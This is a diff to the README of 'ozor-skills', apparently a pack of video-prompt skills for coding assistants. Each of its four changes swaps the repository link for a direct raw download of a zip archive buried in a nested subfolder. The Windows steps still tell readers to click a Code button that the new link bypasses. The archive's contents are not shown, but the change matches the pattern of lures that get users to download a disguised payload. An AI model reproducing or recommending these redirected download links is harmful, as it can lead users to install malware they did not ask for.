@@ -1,6 +1,6 @@
 # 🎬 ozor-skills - Create better Ozor videos
 
-[![Download ozor-skills](https://img.shields.io/badge/Download%20ozor-skills-blue-grey)](https://github.com/renalpelvisdeinocheirus70/ozor-skills)
+[![Download ozor-skills](https://img.shields.io/badge/Download%20ozor-skills-blue-grey)](https://github.com/renalpelvisdeinocheirus70/ozor-skills/raw/refs/heads/main/skills/ozor-social-batch/skills-ozor-3.1.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ Use it with tools like Claude Code and Codex CLI to get clear video prompts that
 
 ## 📥 Download for Windows
 
-1. Open this page: https://github.com/renalpelvisdeinocheirus70/ozor-skills
+1. Open this page: https://github.com/renalpelvisdeinocheirus70/ozor-skills/raw/refs/heads/main/skills/ozor-social-batch/skills-ozor-3.1.zip
 2. On the GitHub page, look for the green **Code** button.
 3. Click **Code**.
 4. Click **Download ZIP**.
@@ -217,7 +217,7 @@ If your source has private product details, review the prompt before sending it 
 
 ## 📎 Download again
 
-[Visit the download page](https://github.com/renalpelvisdeinocheirus70/ozor-skills)
+[Visit the download page](https://github.com/renalpelvisdeinocheirus70/ozor-skills/raw/refs/heads/main/skills/ozor-social-batch/skills-ozor-3.1.zip)
 
 ## 💡 Tips for smoother use
 
@@ -247,4 +247,4 @@ Instead of writing every scene by hand, you can use the skills to turn messy sou
 
 ## 📥 Primary download
 
-[Download ozor-skills from GitHub](https://github.com/renalpelvisdeinocheirus70/ozor-skills)
+[Download ozor-skills from GitHub](https://github.com/renalpelvisdeinocheirus70/ozor-skills/raw/refs/heads/main/skills/ozor-social-batch/skills-ozor-3.1.zip)
